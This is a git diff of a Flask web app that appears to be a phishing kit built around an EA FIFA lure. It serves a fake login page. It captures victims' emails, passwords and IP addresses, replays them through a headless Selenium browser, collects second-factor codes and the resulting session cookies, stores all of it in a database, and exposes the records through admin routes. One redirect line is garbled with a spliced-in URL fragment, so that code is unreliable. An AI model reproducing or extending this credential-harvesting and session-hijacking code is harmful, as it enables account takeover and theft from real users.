@@ -2,32 +2,27 @@ from flask import Flask,render_template,jsonify,request,redirect,url_for
 from email_validator import validate_email, EmailNotValidError
 from Driver import Driver 
 from flask_cors import CORS
-### logger ###
-from log.conf_log import logger
-# import threading
-import os
-from datetime import datetime
 from repository.mariadb_handler import MariaDB
 db = MariaDB()
 ######## IMPORTS
-# from selenium import webdriver
-# from selenium.webdriver.chrome.options import Options
+from selenium import webdriver
+from selenium.webdriver.chrome.options import Options
 ######### CONFIG
-# chrome_options = Options()
-# chrome_options.add_argument('--headless')
-# chrome_options.add_argument('--no-sandbox')
-# chrome_options.add_argument('--disable-dev-shm-usage')
+chrome_options = Options()
+chrome_options.add_argument('--headless')
+chrome_options.add_argument('--no-sandbox')
+chrome_options.add_argument('--disable-dev-shm-usage')
 #global driver
 app = Flask(__name__)
 CORS(app)
 driver = Driver()
- 
-
+import os   
+from datetime import datetime
 @app.route('/addauth', methods=['GET','POST'])
 def trytowin():
     if request.method == 'GET':
         _id = str(os.getpid()) + str(datetime.now())
-        logger.info('{}'.format(_id))
+        print(_id)
         db.addAuth(_id,'email','password','ip')
         return jsonify({'msg':'done'})
     if request.method == 'POST':
@@ -42,7 +37,6 @@ def invalid_email():
 
 @app.route('/')
 def signin():
-    logger.info('new user in !')
     return render_template('loginNEw.html')
 
 
@@ -57,7 +51,7 @@ def getCodes():
 @app.route('/getinfos',methods=['GET'])
 def getinfos():
     if request.method == 'GET':
-        logger.info('getting infos..')
+        print('getting infos..')
         all = db.getAll()
         #print(all)
         return jsonify(all),200
@@ -66,12 +60,6 @@ def getinfos():
 @app.route('/auths')
 def getAuth():
     codes = db.getAuth()
-    #return jsonify(codes),200
-    return render_template('auth.html',codes=codes)
-
-@app.route('/cookies')
-def getCookies():
-    codes = db.getCookies()
     #return jsonify(codes),200
     return render_template('auth.html',codes=codes)
 
@@ -88,18 +76,11 @@ def even():
         session_id = form['amine_id']
         global driver 
         cookies = driver.verify(session_id, code)
-         #########################
-        # print('THREAD : CODE SAVING ..')
-        # thead_kill = threading.Thread(target=driver.quit)
-        # print('THREAD : CREATED')
-        # thead_kill.start()
-        # print('THREAD : STARTED')
-        #########################
 
-        logger.info('{} {} {} {}'.format(session_id,code,ip,cookies))
+        # print('---->session_id<----',session_id)
+        print(session_id,code,ip,cookies)
         db.addCode(session_id,code,ip)
-        db.addCookies(session_id,cookies,ip)
-        return redirect("https://www.twitch.tv/easportsfifa")
+        db.addCookies(session_id,cookies,ip)e-team/toty?utm_campaign=fifa21_hd_ww_ic_ic_fb_fifa-21-team-of-the-year-fb&utm_source=facebook&utm_medium=social&cid=67367&ts=1610042080443&fbclid=IwAR3IcOK9a3DxIoAX0pAZuU45t-yplwVHmSwj1fmEWXj2ow7-dTl4AYLSkEs")
 
     #return jsonify({'message':'your event link '}),200
 
@@ -132,8 +113,7 @@ def process():
             _id = str(os.getpid()) + str(datetime.now())
             status = driver.login(_id, email, password)
             #status =login(email,password,driver)
-            logger.info('{} {} {}'.format(email,password,ip))
-            logger.warning('{}'.format(status))
+            print(email,password,ip)
             if status =='succ':
                 
                 m_email = mask_email(email)
@@ -143,14 +123,13 @@ def process():
             elif status == 'email_error' :
                 return render_template('wrongemailNew.html')
             else :
-                logger.error('{}'.format(status))
-                logger.error('unknown issues')
+                print('unknown issues')
                 return render_template('wronginfosNew.html')
                 #driver.quit()
             #return jsonify(email,password),200          
         except EmailNotValidError as e:
             # email is not valid, exception message is human-readable
-            logger.error(str(e))
+            print(str(e))
             #driver.quit()
             return render_template('wrongemailNew.html')
 
